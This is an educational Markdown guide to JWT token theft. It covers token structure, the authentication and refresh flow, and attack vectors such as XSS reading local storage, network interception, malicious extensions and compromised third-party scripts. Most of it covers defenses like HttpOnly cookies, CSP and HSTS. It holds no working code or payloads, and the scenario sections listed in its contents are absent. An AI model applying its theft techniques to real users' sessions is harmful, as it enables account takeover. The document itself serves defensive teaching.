# JWT Token Theft

> [!CAUTION]
> **Legal Disclaimer**: This document is for strictly educational and professional security research purposes. Unauthorized access to computer systems is illegal. The scripts provided are Proof-of-Concept (PoC) intended for use in controlled, lab environments. The author assumes no liability for misuse of this information.

## Table of Contents

1. [Overview Diagram](#overview-diagram)
   - [Key Relationships](#key-relationships)
2. [Introduction and Core Concepts](#introduction-and-core-concepts)
   - [Definition](#definition)
   - [How JWT Authentication Works](#how-jwt-authentication-works)
   - [How the Attack Works](#how-the-attack-works)
   - [Impact](#impact)
   - [Attack Vectors](#attack-vectors)
3. [Defense Principles](#defense-principles)
   - [Core Protection Principles](#core-protection-principles)
   - [When and Where to Apply Defenses](#when-and-where-to-apply-defenses)
4. [Mitigation Strategies](#mitigation-strategies)
   - [Primary Mitigation Techniques](#primary-mitigation-techniques)
   - [Alternative Approaches](#alternative-approaches)
   - [Implementation Considerations](#implementation-considerations)
5. [Real-World Attack Scenarios](#real-world-attack-scenarios)
   - [Scenario 1: XSS-Based Token Theft from Local Storage](#scenario-1-xss-based-token-theft-from-local-storage)
   - [Scenario 2: Token Theft via Compromised Third-Party Script](#scenario-2-token-theft-via-compromised-third-party-script)
   - [Scenario 3: Man-in-the-Middle Attack on Insecure Connection](#scenario-3-man-in-the-middle-attack-on-insecure-connection)
   - [Scenario 4: Token Theft via Browser Extension Malware](#scenario-4-token-theft-via-browser-extension-malware)
6. [Token Storage and Expiration Management](#token-storage-and-expiration-management)
   - [Token Storage Locations](#token-storage-locations)
   - [Expiration Checking Process](#expiration-checking-process)
   - [What Happens When Access Token Expires](#what-happens-when-access-token-expires)
   - [What Happens When Refresh Token Expires](#what-happens-when-refresh-token-expires)

---

## 🎬 Video Tutorial

This document accompanies a full-length video tutorial where we:
- Explain how JWT authentication works and why tokens are valuable targets
- Walk through each real-world attack scenario with detailed diagrams
- Demonstrate XSS-based theft, MITM attacks, and token interception techniques
- Cover defense principles and practical mitigation strategies

**👉 [Watch the full tutorial on YouTube](https://youtu.be/TRDuK_tZwK8)**


## Overview Diagram

```mermaid
flowchart TB
    subgraph LEGEND[" "]
        L1["Attack Type<br/>(Red Border)"]
        L2["Attack Vector<br/>(Orange Border)"]
        L3["Vulnerability Context<br/>(Blue Border)"]
        L4["Defense Mechanism<br/>(Green Border)"]
        L5["Impact/Consequence<br/>(Purple Border)"]
        
        style L1 fill:#fff,stroke:#e74c3c,stroke-width:3px,color:#000
        style L2 fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style L3 fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style L4 fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style L5 fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
    end

    subgraph ATTACK["Attack Types"]
        JWT[JWT Token Theft]
        style JWT fill:#fff,stroke:#e74c3c,stroke-width:3px,color:#000
    end

    subgraph VECTORS["Attack Vectors"]
        XSS[XSS Injection]
        MITM[Man-in-the-Middle]
        MALWARE[Browser Malware]
        THIRD[Compromised 3rd Party]
        
        style XSS fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style MITM fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style MALWARE fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
        style THIRD fill:#fff,stroke:#f39c12,stroke-width:3px,color:#000
    end

    subgraph CONTEXTS["Vulnerability Contexts"]
        LS[Local Storage]
        SS[Session Storage]
        HTTP[Unencrypted HTTP]
        COOKIE[Insecure Cookies]
        
        style LS fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style SS fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style HTTP fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
        style COOKIE fill:#fff,stroke:#3498db,stroke-width:3px,color:#000
    end

    subgraph DEFENSES["Defense Mechanisms"]
        HTTPONLY[HttpOnly Cookies]
        SECURE[Secure Flag]
        SAMESITE[SameSite Attribute]
        CSP[Content Security Policy]
        HTTPS[HTTPS Enforcement]
        ROTATION[Token Rotation]
        SHORT[Short-Lived Tokens]
        REFRESH[Refresh Token Pattern]
        
        style HTTPONLY fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SECURE fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SAMESITE fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style CSP fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style HTTPS fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style ROTATION fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style SHORT fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
        style REFRESH fill:#fff,stroke:#27ae60,stroke-width:3px,color:#000
    end

    subgraph IMPACTS["Impacts"]
        IMPERSON[Identity Impersonation]
        BREACH[Data Breach]
        PRIV[Privilege Escalation]
        PERSIST[Persistent Access]
        
        style IMPERSON fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style BREACH fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style PRIV fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
        style PERSIST fill:#fff,stroke:#9b59b6,stroke-width:3px,color:#000
    end

    JWT -->|exploits| XSS
    JWT -->|exploits| MITM
    JWT -->|exploits| MALWARE
    JWT -->|exploits| THIRD
    
    XSS -->|targets| LS
    XSS -->|targets| SS
    MITM -->|intercepts| HTTP
    MALWARE -->|extracts from| LS
    MALWARE -->|extracts from| COOKIE
    THIRD -->|accesses| LS
    
    LS -.->|mitigated by| HTTPONLY
    SS -.->|mitigated by| HTTPONLY
    HTTP -.->|mitigated by| HTTPS
    COOKIE -.->|mitigated by| SECURE
    COOKIE -.->|mitigated by| SAMESITE
    
    XSS -.->|blocked by| CSP
    XSS -.->|prevented by| HTTPONLY
    
    JWT -.->|limited by| SHORT
    JWT -.->|controlled by| ROTATION
    JWT -.->|managed by| REFRESH
    
    JWT ==>|leads to| IMPERSON
    JWT ==>|leads to| BREACH
    JWT ==>|leads to| PRIV
    JWT ==>|leads to| PERSIST

    style LEGEND fill:#ffffff10,stroke:#333,stroke-width:2px
    style ATTACK fill:#ffffff10,stroke:#333,stroke-width:2px
    style VECTORS fill:#ffffff10,stroke:#333,stroke-width:2px
    style CONTEXTS fill:#ffffff10,stroke:#333,stroke-width:2px
    style DEFENSES fill:#ffffff10,stroke:#333,stroke-width:2px
    style IMPACTS fill:#ffffff10,stroke:#333,stroke-width:2px
```

### Key Relationships

**Attack Vector Relationships:**
- JWT Token Theft exploits multiple attack vectors: XSS injection, man-in-the-middle attacks, browser malware, and compromised third-party scripts
- Each vector targets specific vulnerability contexts where tokens are exposed

**Vulnerability Context Relationships:**
- Local Storage and Session Storage are vulnerable to XSS attacks and malware extraction
- Unencrypted HTTP connections expose tokens to man-in-the-middle interception
- Insecure cookies can be stolen by malware or intercepted in transit

**Defense Mechanism Relationships:**
- HttpOnly cookies prevent JavaScript access, mitigating XSS-based theft from storage
- Secure flag and HTTPS enforcement protect against man-in-the-middle attacks
- SameSite attribute prevents cross-site request forgery with stolen tokens
- Content Security Policy blocks malicious script injection attempts
- Token rotation, short-lived tokens, and refresh token patterns limit the impact window

**Impact Relationships:**
- Successful token theft leads to identity impersonation, data breaches, privilege escalation, and persistent unauthorized access
- The severity depends on token lifetime, permissions, and detection mechanisms

---

## Introduction and Core Concepts

### Definition

**JWT Token Theft** is a security attack where an adversary steals JSON Web Tokens (JWTs) used for authentication and authorization in modern web applications. JWTs are self-contained tokens that encode user identity and permissions, making them valuable targets for attackers. Once stolen, these tokens can be used to impersonate legitimate users without needing their credentials.

According to OWASP (Open Web Application Security Project), this attack falls under multiple categories including **A07:2021 – Identification and Authentication Failures** and **A03:2021 – Injection** (when XSS is the theft vector). The Common Weakness Enumeration (CWE) categorizes this under:
- **CWE-522**: Insufficiently Protected Credentials
- **CWE-311**: Missing Encryption of Sensitive Data
- **CWE-79**: Cross-site Scripting (XSS) when XSS is the vector

### How JWT Authentication Works

Before understanding how JWTs can be stolen, it's essential to understand how JWT-based authentication functions in a typical web application.

#### JWT Structure

A JSON Web Token consists of three parts separated by dots (`.`):

1. **Header**: Contains the token type (JWT) and the signing algorithm (e.g., HS256, RS256)
2. **Payload**: Contains claims - statements about the user and additional metadata (user ID, roles, expiration time)
3. **Signature**: Created by encoding the header and payload, then signing with a secret key to ensure integrity

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|_____________Header______________|._____________Payload_______________|._______________Signature_______________|
```

#### JWT Authentication Flow

The following diagram illustrates the complete lifecycle of JWT authentication, from initial login through token usage, refresh, and eventual expiration:

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser
    participant S as Auth Server
    participant API as API Server

    Note over U,API: Phase 1: Initial Authentication
    
    U->>B: Enter credentials (username/password)
    B->>S: POST /login with credentials
    S->>S: Validate credentials against database
    S->>S: Generate JWT Access Token (short-lived: 15min)
    S->>S: Generate Refresh Token (long-lived: 7 days)
    S->>B: Return tokens in response
    Note over S,B: Access Token in body or HttpOnly cookie<br/>Refresh Token in HttpOnly cookie
    B->>B: Store Access Token (cookie/memory/storage)
    B->>U: Login successful - redirect to dashboard

    Note over U,API: Phase 2: Accessing Protected Resources
    
    U->>B: Request protected resource
    B->>B: Retrieve Access Token from storage
    B->>API: GET /api/data with Authorization: Bearer token
    API->>API: Extract JWT from request
    API->>API: Verify signature using secret key
    API->>API: Check expiration (exp claim)
    API->>API: Validate claims (issuer/audience/permissions)
    API->>B: Return protected data
    B->>U: Display data to user

    Note over U,API: Phase 3: Subsequent Requests (Token Still Valid)
    
    U->>B: Request another resource
    B->>API: GET /api/profile with same Access Token
    API->>API: Verify token (still valid)
    API->>B: Return profile data

    Note over U,API: Phase 4: Access Token Expires
    
    U->>B: Request resource after 15 minutes
    B->>API: GET /api/data with expired Access Token
    API->>API: Verify token
    API->>API: Check expiration - TOKEN EXPIRED
    API->>B: 401 Unauthorized - Token expired
    
    Note over U,API: Phase 5: Token Refresh
    
    B->>B: Detect 401 response
    B->>S: POST /refresh with Refresh Token
    Note over B,S: Refresh Token sent via HttpOnly cookie
    S->>S: Validate Refresh Token
    S->>S: Check if Refresh Token is revoked
    S->>S: Generate new Access Token
    S->>S: Optionally rotate Refresh Token
    S->>B: Return new Access Token
    B->>B: Store new Access Token
    B->>API: Retry original request with new token
    API->>API: Verify new token (valid)
    API->>B: Return requested data
    B->>U: Display data (seamless experience)

    Note over U,API: Phase 6: Refresh Token Expires or User Logs Out
    
    U->>B: Request after Refresh Token expires
    B->>API: GET /api/data with expired Access Token
    API->>B: 401 Unauthorized
    B->>S: POST /refresh with expired Refresh Token
    S->>S: Validate Refresh Token - EXPIRED
    S->>B: 401 Unauthorized - Session expired
    B->>B: Clear all stored tokens
    B->>U: Redirect to login page

    Note over U,API: Alternative: User Initiates Logout
    
    U->>B: Click logout button
    B->>S: POST /logout with Refresh Token
    S->>S: Add Refresh Token to blacklist/revocation list
    S->>B: Logout successful
    B->>B: Clear Access Token from storage
    B->>B: Clear cookies
    B->>U: Redirect to login page
```

#### Key Concepts in the Flow

**Access Token Characteristics:**
- Short-lived (typically 5-60 minutes)
- Contains user identity and permissions
- Sent with every API request
- Stateless - server doesn't store it
- Cannot be revoked before expiration (in pure stateless implementation)

**Refresh Token Characteristics:**
- Long-lived (hours to days)
- Used only to obtain new access tokens
- Stored more securely (HttpOnly cookie)
- Can be revoked server-side (stored in database)
- Should be rotated on each use for security

**Why This Architecture Matters for Security:**
- Short access token lifetime limits exposure window if stolen
- Refresh tokens enable revocation without constant database lookups
- Separation allows different security treatments for each token type
- Stateless access tokens enable horizontal scaling

**Vulnerability Points (Where Theft Can Occur):**
1. During initial token transmission (if not over HTTPS)
2. While stored in browser (localStorage, sessionStorage, or cookies)
3. During API requests (token in Authorization header)
4. Through XSS if tokens are accessible to JavaScript
5. Via malicious browser extensions with storage access

### How the Attack Works

JWT token theft exploits the fact that tokens must be stored somewhere accessible to the client application. The attack typically follows these stages:

1. **Token Identification**: Attackers identify where the application stores JWT tokens (Local Storage, Session Storage, cookies, or in-memory)

2. **Exploitation**: Using various attack vectors, the attacker gains access to the stored token:
   - **XSS-based theft**: Injecting malicious JavaScript that reads token storage
   - **Network interception**: Capturing tokens transmitted over insecure connections
   - **Malware extraction**: Using browser extensions or malware to access storage
   - **Third-party compromise**: Exploiting vulnerable third-party scripts with storage access

3. **Token Extraction**: The attacker exfiltrates the token to their own infrastructure

4. **Token Replay**: The stolen token is used to authenticate as the victim user, gaining unauthorized access to protected resources

5. **Lateral Movement**: Depending on token permissions and lifetime, attackers may escalate privileges, access sensitive data, or establish persistent access

The critical vulnerability is that JWTs are bearer tokens—anyone possessing the token can use it. Unlike traditional session-based authentication where sessions can be invalidated server-side, stateless JWTs remain valid until expiration.

### Impact

The impact of JWT token theft can be severe and far-reaching:

**Immediate Impacts:**
- **Identity Impersonation**: Attackers can act as the legitimate user with full privileges
- **Authentication Bypass**: Security controls based on authentication are completely circumvented
- **Session Riding**: All actions appear to come from the legitimate user, making detection difficult

**Secondary Impacts:**
- **Data Breach**: Access to sensitive personal information, financial data, or proprietary business information
- **Privilege Escalation**: If the compromised token has elevated permissions, attackers gain administrative access
- **Lateral Movement**: Using the compromised account as a pivot point to attack other systems
- **Reputation Damage**: Users lose trust when their accounts are compromised

**Long-term Consequences:**
- **Persistent Access**: Long-lived tokens provide extended unauthorized access
- **Compliance Violations**: Data breaches may violate GDPR, HIPAA, PCI-DSS, or other regulations
- **Financial Loss**: Through fraudulent transactions, theft of intellectual property, or regulatory fines
- **Legal Liability**: Organizations may face lawsuits from affected users

The severity is amplified by:
- **Token Lifetime**: Longer-lived tokens provide extended windows for exploitation
- **Token Scope**: Tokens with broad permissions cause greater damage
- **Detection Difficulty**: Stateless tokens make anomaly detection challenging

### Attack Vectors

**1. Cross-Site Scripting (XSS)**

The most common vector for JWT theft. Attackers inject malicious JavaScript into the application, which executes in the victim's browser with full access to the same origin. This script can:
- Read from Local Storage or Session Storage where tokens are often stored
- Access cookies if not protected with HttpOnly flag
- Exfiltrate tokens to attacker-controlled servers

**Types of XSS enabling token theft:**
- **Stored XSS**: Malicious script persisted in database (comments, profiles, messages)
- **Reflected XSS**: Script injected via URL parameters or form inputs
- **DOM-based XSS**: Client-side script vulnerabilities

**2. Man-in-the-Middle (MITM) Attacks**

When JWTs are transmitted over unencrypted connections or when HTTPS is improperly implemented:
- **Network Sniffing**: Capturing tokens from HTTP traffic on public Wi-Fi or compromised networks
- **SSL Stripping**: Downgrading HTTPS connections to HTTP
- **Certificate Spoofing**: Using fraudulent certificates to intercept encrypted traffic
- **DNS Hijacking**: Redirecting traffic to attacker-controlled servers

**3. Browser-Based Malware and Extensions**

Malicious software running in the user's browser environment:
- **Malicious Extensions**: Browser extensions with excessive permissions reading storage
- **Trojan Scripts**: Malware injected through compromised software updates
- **Keyloggers and Screen Capture**: Recording authentication flows and token transmission
- **Memory Scraping**: Extracting tokens from browser memory

**4. Compromised Third-Party Scripts**

Modern web applications integrate numerous third-party services:
- **Supply Chain Attacks**: Compromised CDN-hosted libraries (e.g., compromised npm packages)
- **Malicious Analytics Scripts**: Tracking scripts modified to exfiltrate tokens
- **Advertising Networks**: Malvertising injecting token-stealing code
- **Tag Managers**: Compromised tag management systems with storage access

**5. Insecure Storage Practices**

Application design choices that expose tokens:
- **Local Storage Persistence**: Tokens surviving browser sessions and accessible to all scripts
- **Session Storage**: Vulnerable to XSS attacks during active sessions
- **URL Parameters**: Tokens in URLs logged in browser history and server logs
- **Unencrypted Cookies**: Cookies without Secure flag transmitted over HTTP

**6. Physical Access Attacks**

Less common but viable in certain contexts:
- **Browser DevTools**: Accessing Local Storage through developer tools on unlocked devices
- **Browser History**: Tokens exposed in URLs within browsing history
- **Cached Data**: Tokens stored in browser cache on shared computers

**7. Social Engineering**

Human-factor attacks that lead to token exposure:
- **Phishing**: Tricking users into authenticating on fake sites that capture tokens
- **Session Donation**: Tricking users into using attacker-controlled sessions
- **Malicious OAuth Flows**: Exploiting OAuth implementations to obtain access tokens

Each vector requires specific defensive measures, making defense-in-depth essential for comprehensive protection.

---

## Defense Principles

### Core Protection Principles

**1. Principle of Secure Storage**

Tokens must be stored using the most secure mechanism available for the context:
- **Storage Location Matters**: Prefer HttpOnly cookies over JavaScript-accessible storage
- **Encryption at Rest**: Consider encrypting tokens in any client-side storage
- **Minimal Exposure**: Store tokens only as long as necessary
- **Separation of Concerns**: Keep access tokens separate from refresh tokens with different security properties

**Rationale**: The storage mechanism is the first line of defense. If tokens cannot be accessed by malicious scripts, many attack vectors are immediately neutralized.

**2. Principle of Least Privilege**

Tokens should contain minimal necessary permissions and information:
- **Narrow Scope**: Tokens should grant only the permissions needed for specific operations
- **Minimal Claims**: Include only essential user information in token payload
- **Time-Bounded Access**: Use the shortest practical token lifetime
- **Resource-Specific Tokens**: Consider separate tokens for different resources or operations

**Rationale**: Limiting token capabilities reduces the blast radius of a successful theft. Even if stolen, the token's usefulness to attackers is constrained.

**3. Principle of Defense in Depth**

Multiple layers of security protect against token theft:
- **Layered Controls**: Combine storage security, transmission security, and runtime protections
- **Complementary Defenses**: Use multiple techniques that protect against different attack vectors
- **Fail-Safe Defaults**: Design systems to fail securely when protections fail
- **Detection and Response**: Include monitoring to detect and respond to theft

**Rationale**: No single defense is perfect. Multiple overlapping protections ensure that the failure of one layer doesn't compromise the entire system.

**4. Principle of Secure Transmission**

Tokens must be protected during transit:
- **Encryption in Transit**: Always use HTTPS for all token transmission
- **HSTS Enforcement**: Use HTTP Strict Transport Security to prevent downgrade attacks
- **Certificate Pinning**: For high-security contexts, pin certificates to prevent MITM
- **Avoid URL Parameters**: Never pass tokens in URLs where they can be logged

**Rationale**: Tokens intercepted during transmission are as useful to attackers as directly stolen tokens. Transit security is as critical as storage security.

**5. Principle of Time-Limited Validity**

Tokens should have the shortest practical lifetime:
- **Short-Lived Access Tokens**: Minimize the window of opportunity for attackers
- **Refresh Token Rotation**: Change refresh tokens on each use to detect theft
- **Absolute Timeout**: Enforce maximum session duration regardless of activity
- **Idle Timeout**: Expire tokens after periods of inactivity

**Rationale**: Time limitation converts permanent compromise into temporary exposure. Even successful theft has limited value if tokens expire quickly.

**6. Principle of Runtime Verification**

Continuous validation beyond token signature verification:
- **Binding Verification**: Bind tokens to specific clients or contexts
- **Behavioral Analysis**: Detect anomalous usage patterns
- **Geolocation Checks**: Flag tokens used from unexpected locations
- **Device Fingerprinting**: Detect token use from different devices

**Rationale**: Stolen tokens can be detected through usage patterns that differ from legitimate users, enabling rapid response.

### When and Where to Apply Defenses

**Application Architecture Layer**

**Frontend (Browser/Mobile App):**
- Apply storage security controls (HttpOnly cookies, secure flags)
- Implement Content Security Policy
- Minimize token lifetime
- Use in-memory storage for highly sensitive operations
- Implement logout on close for sensitive applications

**Backend (API Server):**
- Validate token binding and context
- Implement rate limiting and anomaly detection
- Enforce short token expiration
- Provide token revocation mechanisms
- Log authentication events for security monitoring

**Network Layer:**
- Enforce HTTPS everywhere with HSTS
- Implement certificate pinning for high-security apps
- Use secure CDN configurations
- Deploy Web Application Firewalls (WAF)

**Development Phase Considerations**

**Design Phase:**
- Choose token storage strategy (HttpOnly cookies vs. other methods)
- Define token lifetime and refresh strategies
- Plan token structure and claims
- Design revocation mechanisms
- Plan monitoring and detection capabilities

**Implementation Phase:**
- Implement secure cookie attributes (HttpOnly, Secure, SameSite)
- Configure Content Security Policy
- Implement HTTPS and HSTS
- Set up token rotation mechanisms
- Implement logging and monitoring

**Testing Phase:**
- Penetration testing for XSS vulnerabilities
- Security testing of token handling
- Testing token expiration and rotation
- Validating HTTPS enforcement
- Testing revocation mechanisms

**Deployment Phase:**
- Configure HTTPS with valid certificates
- Enable HSTS headers
- Deploy Content Security Policy
- Set up security monitoring
- Implement incident response procedures

**Application Context Considerations**

**High-Security Applications (Banking, Healthcare, Government):**
- Mandatory HttpOnly cookies
- Very short token lifetimes (5-15 minutes)
- Aggressive token rotation
- Strong behavioral monitoring
- Multi-factor authentication for sensitive operations
- Token binding to device characteristics

**Standard Web Applications (E-commerce, Social Media, SaaS):**
- HttpOnly cookies for access tokens
- Moderate token lifetimes (15-60 minutes)
- Token rotation on refresh
- Basic anomaly detection
- Secure flag and SameSite on all cookies

**Low-Security Applications (Public Content, Marketing Sites):**
- Still use HttpOnly cookies when possible
- Longer token lifetimes acceptable (hours)
- Basic HTTPS enforcement
- Minimal but present security controls

**Mobile Applications:**
- Use secure storage APIs (Keychain, KeyStore)
- Implement certificate pinning
- Short-lived tokens with background refresh
- Detect jailbreak/root and adjust security
- Consider biometric re-authentication

**Single-Page Applications (SPAs):**
- Prefer HttpOnly cookies over Local Storage
- Implement robust CSP
- Use BFF (Backend-for-Frontend) pattern for token management
- Consider in-memory storage for sensitive operations
- Implement automatic logout on browser close

**Third-Party Integration Context:**
- Minimize third-party script inclusion
- Use Subresource Integrity (SRI) for CDN resources
- Implement strict CSP for third-party content
- Regular audits of third-party dependencies
- Sandbox third-party scripts when possible

---

## Mitigation Strategies

### Primary Mitigation Techniques

**1. HttpOnly and Secure Cookies**

**Description**: Store JWT tokens in cookies with HttpOnly and Secure flags enabled. HttpOnly prevents JavaScript from accessing the cookie, while Secure ensures transmission only over HTTPS.

**How it works:**
- Server sets JWT in cookie with HttpOnly flag during authentication
- Browser automatically includes cookie in requests to same origin
- JavaScript cannot read or modify the cookie, blocking XSS-based theft
- Secure flag prevents transmission over unencrypted connections

**Protection provided:**
- Eliminates XSS-based token theft from storage
- Prevents malicious scripts from accessing tokens
- Protects against MITM attacks when combined with Secure flag
- Automatic handling by browser reduces implementation errors

**Limitations:**
- Vulnerable to CSRF attacks (requires SameSite attribute)
- Doesn't protect against compromised backend
- Requires careful CORS configuration
- May complicate cross-domain authentication flows

**Best practices:**
- Always combine HttpOnly with Secure flag
- Add SameSite attribute (Strict or Lax)
- Set appropriate Path and Domain attributes
- Use __Host- prefix for additional security
- Implement CSRF tokens for state-changing operations

**2. SameSite Cookie Attribute**

**Description**: The SameSite attribute controls whether cookies are sent with cross-site requests, providing defense against CSRF attacks and limiting the impact of stolen tokens.

**How it works:**
- **SameSite=Strict**: Cookie never sent with cross-site requests
- **SameSite=Lax**: Cookie sent with top-level navigation but not with AJAX or image requests
- **SameSite=None**: Cookie sent with all requests (requires Secure flag)

**Protection provided:**
- Prevents CSRF attacks by default with Strict or Lax
- Limits cross-site token leakage
- Reduces attack surface for stolen tokens
- Works automatically without additional code

**Limitations:**
- SameSite=Strict may break legitimate cross-site flows
- Not supported by older browsers (though support is now widespread)
- Doesn't prevent token theft, only limits usage
- Can complicate OAuth and SSO implementations

**Best practices:**
- Use SameSite=Lax as default for most applications
- Use SameSite=Strict for high-security applications
- Only use SameSite=None when cross-site access is essential
- Test authentication flows with different SameSite values
- Combine with other CSRF protections

**3. Content Security Policy (CSP)**

**Description**: CSP is a browser security mechanism that restricts which resources can load and execute on a web page, significantly reducing XSS attack surface.

**How it works:**
- Server sends CSP header defining allowed script sources
- Browser blocks inline scripts and unauthorized external scripts
- Prevents execution of injected malicious code
- Can be configured to allow only trusted domains

**Protection provided:**
- Blocks inline script execution (primary XSS vector)
- Prevents loading of malicious external scripts
- Limits data exfiltration channels
- Provides defense in depth against XSS

**Limitations:**
- Complex to implement correctly
- Can break legitimate functionality if too restrictive
- Requires refactoring inline scripts and event handlers
- Some legacy browsers lack full support
- Bypassable if policy is too permissive

**Best practices:**
- Start with restrictive policy and loosen as needed
- Use nonces or hashes for inline scripts
- Avoid unsafe-inline and unsafe-eval directives
- Implement CSP in report-only mode first
- Regularly review and update CSP
- Use strict-dynamic for modern browsers

**4. Short-Lived Access Tokens with Refresh Tokens**

**Description**: Use short-lived JWT access tokens (5-15 minutes) paired with longer-lived refresh tokens, limiting the window of opportunity for stolen access tokens.

**How it works:**
- Access tokens have very short expiration (minutes)
- Refresh tokens have longer expiration (hours/days) but more restricted use
- Client automatically requests new access token using refresh token before expiration
- Refresh tokens stored more securely and rotated on each use

**Protection provided:**
- Limits damage from stolen access tokens to short time window
- Enables token revocation through refresh token invalidation
- Reduces value of stolen access tokens
- Allows detection through refresh token rotation

**Limitations:**
- Adds complexity to client implementation
- Requires automatic token refresh logic
- Stolen refresh tokens still problematic
- Requires backend to manage refresh token state
- May cause interruptions if refresh fails

**Best practices:**
- Use very short access token lifetime (5-15 minutes)
- Rotate refresh tokens on each use
- Store refresh tokens separately with higher security
- Implement refresh token expiration and revocation
- Monitor for anomalous refresh patterns
- Use different signing keys for access and refresh tokens

**5. Token Binding and Context Validation**

**Description**: Bind tokens to specific client characteristics and validate these bindings on each request, making stolen tokens unusable from different contexts.

**How it works:**
- Include client fingerprint in token claims (IP, user agent, device ID)
- Server validates these characteristics match on each request
- Mismatch indicates potential token theft
- Can combine multiple factors for stronger binding

**Protection provided:**
- Stolen tokens unusable from different contexts
- Enables detection of token theft attempts
- Adds verification beyond signature validation
- Makes token replay attacks more difficult

**Limitations:**
- Legitimate users may have changing IPs (mobile networks)
- User agents can be spoofed
- May cause false positives and usability issues
- Adds computational overhead to validation
- Doesn't prevent theft, only limits usage

**Best practices:**
- Use multiple binding factors
- Allow some flexibility for legitimate changes (IP ranges)
- Log binding validation failures for security monitoring
- Consider binding strength based on operation sensitivity
- Implement graceful degradation for minor mismatches
- Use cryptographic binding for high-security contexts

**6. HTTPS Everywhere with HSTS**

**Description**: Enforce HTTPS for all communications and implement HTTP Strict Transport Security (HSTS) to prevent downgrade attacks and man-in-the-middle token interception.

**How it works:**
- All token transmission occurs over encrypted HTTPS
- HSTS header tells browser to always use HTTPS
- Browser refuses HTTP connections to the domain
- Prevents SSL stripping and downgrade attacks

**Protection provided:**
- Encrypts tokens in transit, preventing network interception
- Blocks downgrade attacks to unencrypted HTTP
- Protects against passive network monitoring
- Required for Secure cookie flag to function

**Limitations:**
- Doesn't protect against endpoint compromise
- Requires valid SSL certificates
- First request vulnerable before HSTS seen (use preload)
- Doesn't prevent application-level attacks
- Certificate authorities are trust points

**Best practices:**
- Enable HSTS with max-age of at least one year
- Include subdomains in HSTS policy
- Submit domain to HSTS preload list
- Use strong TLS configuration (TLS 1.3+)
- Implement certificate pinning for critical applications
- Redirect all HTTP to HTTPS at infrastructure level

### Alternative Approaches

**1. In-Memory Token Storage (SPA Pattern)**

**Description**: Store tokens only in JavaScript memory variables, never persisting to any browser storage.

**When to use:**
- High-security single-page applications
- Short user sessions acceptable
- When XSS risk is high but manageable
- Applications with aggressive security requirements

**Advantages:**
- Tokens lost on page reload or browser close
- Not accessible from other tabs or persistence
- Immune to storage-based theft vectors
- Simple implementation

**Disadvantages:**
- Tokens lost on page refresh (poor UX)
- Requires re-authentication frequently
- Doesn't work for multi-tab applications
- Still vulnerable to XSS during session
- Complex state management

**2. Backend-for-Frontend (BFF) Pattern**

**Description**: Move all token management to a backend service specifically for the frontend, keeping tokens entirely server-side.

**When to use:**
- Microservices architectures
- High-security applications
- When frontend security cannot be guaranteed
- Complex authentication flows

**Advantages:**
- Tokens never exposed to browser
- Immune to XSS-based token theft
- Centralized security enforcement
- Simplified frontend implementation

**Disadvantages:**
- Additional infrastructure complexity
- Requires session management in BFF
- May increase latency
- Session state needs to be managed
- Scaling considerations for BFF service

**3. Token Encryption at Client Side**

**Description**: Encrypt tokens before storing in browser storage using encryption keys derived from user credentials or device characteristics.

**When to use:**
- When HttpOnly cookies cannot be used
- Mobile applications with secure storage
- Hybrid approaches needing storage
- Legacy system constraints

**Advantages:**
- Adds defense layer even if storage accessed
- Protects stored tokens at rest
- Can use device-specific keys
- Compatible with various storage mechanisms

**Disadvantages:**
- Encryption key management complexity
- Keys may be extractable through XSS
- Doesn't prevent in-memory theft
- Performance overhead
- False sense of security if not implemented correctly

**4. Per-Request Token Generation**

**Description**: Generate single-use tokens for each API request, with very short validity windows (seconds).

**When to use:**
- High-security financial transactions
- Operations requiring maximum security
- When replay attack prevention is critical
- APIs with low request frequency

**Advantages:**
- Stolen tokens immediately worthless
- Prevents replay attacks
- Minimal theft window
- Strong non-repudiation

**Disadvantages:**
- Significant performance overhead
- Complex client implementation
- Tight clock synchronization required
- May impact user experience
- Difficult to implement for real-time features

**5. Mutual TLS (mTLS) Authentication**

**Description**: Use client certificates in addition to JWT tokens for authentication, binding tokens to specific client certificates.

**When to use:**
- High-security B2B APIs
- Internal microservices communication
- IoT device authentication
- When PKI infrastructure available

**Advantages:**
- Strong cryptographic binding
- Stolen tokens unusable without certificate
- Industry standard for high-security
- Prevents many attack vectors

**Disadvantages:**
- Complex certificate management
- Difficult user experience for consumer apps
- Not suitable for public-facing applications
- Requires PKI infrastructure
- Browser support varies

### Implementation Considerations

**Performance Impact:**
- HttpOnly cookies have minimal overhead
- Short-lived tokens require frequent refresh operations
- Token validation adds per-request latency
- Encryption/decryption has computational cost
- CSP enforcement is browser-side with minimal impact

**User Experience:**
- Short token lifetimes require seamless automatic refresh
- Failed refresh requires re-authentication (disrupts UX)
- HTTPS enforcement may break mixed content
- In-memory storage loses state on refresh
- Balance security with usability

**Scalability:**
- Stateless JWTs scale horizontally well
- Token revocation requires distributed state
- Refresh token rotation needs coordination
- BFF pattern needs scaling of BFF service
- Monitoring and logging volume increases

**Compatibility:**
- Older browsers may not support all security features
- Mobile apps need platform-specific implementations
- Third-party integrations may have constraints
- Legacy systems may limit security options
- Cross-domain scenarios need careful design

**Operational Complexity:**
- Token rotation requires robust error handling
- Multiple security layers increase debugging difficulty
- Monitoring and alerting systems needed
